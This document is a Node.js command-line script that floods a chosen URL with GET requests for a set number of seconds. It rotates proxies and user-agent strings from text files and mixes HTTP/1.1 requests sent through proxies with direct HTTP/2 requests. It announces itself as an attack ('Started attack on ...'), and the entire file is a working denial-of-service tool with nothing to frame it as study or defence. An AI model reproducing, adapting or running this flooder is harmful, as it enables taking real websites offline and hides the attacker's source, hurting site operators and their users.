const http2 = require('http2');
const http = require('http');
const crypto = require('crypto');
const fs = require('fs');
const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);

function getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function generateHeaders() {
    return {
        'User-Agent': getRandomElement(userAgents),
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
    };
}

function sendRequest(url, proxy) {
    if (Math.random() > 0.5) {
        // HTTP/1.1 through proxy
        const proxyHost = proxy.split(':')[0];
        const proxyPort = proxy.split(':')[1];
        const options = {
            hostname: proxyHost,
            port: proxyPort,
            path: url,
            method: 'GET',
            headers: generateHeaders(),
        };

        const req = http.request(options);
        req.on('error', () => {});
        req.end();
    } else {
        // HTTP/2 direct request
        try {
            const parsedUrl = new URL(url);
            const client = http2.connect(parsedUrl.origin);
            
            // Create headers without HTTP/1 specific fields
            const headers = { ...generateHeaders() };
            delete headers.Connection; // Remove Connection header for HTTP/2

            // Set required HTTP/2 pseudo-headers
            headers[':path'] = parsedUrl.pathname + parsedUrl.search;
            headers[':method'] = 'GET';
            headers[':authority'] = parsedUrl.host;

            const req = client.request(headers);
            req.on('error', () => {});
            req.end();
            
            // Close client after request
            req.on('end', () => client.close());
            req.on('error', () => client.close());
        } catch (e) {
            // Invalid URL or connection error
        }
    }
}

async function main(url, duration) {
    console.log(`Started attack on ${url} for ${duration} seconds...`);
    const endTime = Date.now() + duration * 1000;

    while (Date.now() < endTime) {
        const proxy = getRandomElement(proxies);
        sendRequest(url, proxy);
    }

    console.log(`Finished attack on ${url}!`);
}

if (process.argv.length !== 4) {
    console.log('Usage: node http.js <url> <time>');
    process.exit(1);
}

const url = process.argv[2];
const duration = parseInt(process.argv[3]);
main(url, duration);
